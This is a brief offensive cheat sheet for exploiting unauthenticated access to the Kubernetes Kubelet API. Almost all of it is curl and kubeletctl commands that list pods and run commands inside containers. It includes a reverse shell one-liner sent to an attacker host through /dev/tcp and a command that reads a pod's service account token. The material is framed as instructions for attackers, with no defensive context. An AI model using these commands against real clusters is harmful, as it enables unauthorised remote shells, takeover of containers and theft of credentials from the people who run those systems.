# Kubernetes Kubelet Unauthenticated RCE

The Kubelet API (port 10250) may allow unauthenticated access. Use it to list pods and exec commands in running containers.

```bash
# List pods via Kubelet
curl -sk https://<NODE>:10250/pods | python3 -m json.tool | grep -E '"name"|"namespace"'

# Exec command in a pod container
curl -sk https://<NODE>:10250/run/<NAMESPACE>/<POD_NAME>/<CONTAINER_NAME> \
  -d 'cmd=id'

# Get reverse shell
curl -sk https://<NODE>:10250/run/<NAMESPACE>/<POD_NAME>/<CONTAINER_NAME> \
  -d 'cmd=bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"'

# Using kubeletctl tool
kubeletctl --server <NODE> pods
kubeletctl --server <NODE> exec "id" -p <POD> -c <CONTAINER> -n <NAMESPACE>
kubeletctl --server <NODE> exec "/bin/bash" -p <POD> -c <CONTAINER> -n <NAMESPACE>

# Steal service account token from privileged pod
curl -sk https://<NODE>:10250/run/<NS>/<POD>/<CONTAINER> \
  -d 'cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token'
```
